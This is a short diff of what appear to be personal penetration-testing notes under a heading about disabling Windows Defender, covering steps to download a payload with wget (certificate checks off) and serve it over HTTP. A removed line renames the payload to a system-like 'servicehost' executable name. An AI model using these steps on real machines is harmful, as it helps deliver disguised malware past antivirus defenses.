@@ -138,7 +138,9 @@ Disable Windows Defender:
 
 1. **Download Payload**
     
-    `wget <payload_download_link> --no-check-certificate mv <payload_name>.exe servicehost-haji.exe`
+    `wget <payload_download_link> --no-check-certificate
+    
+    ![[Pasted image 20251018170657.png]]
     
 2. **Serve Payload over HTTP**
     
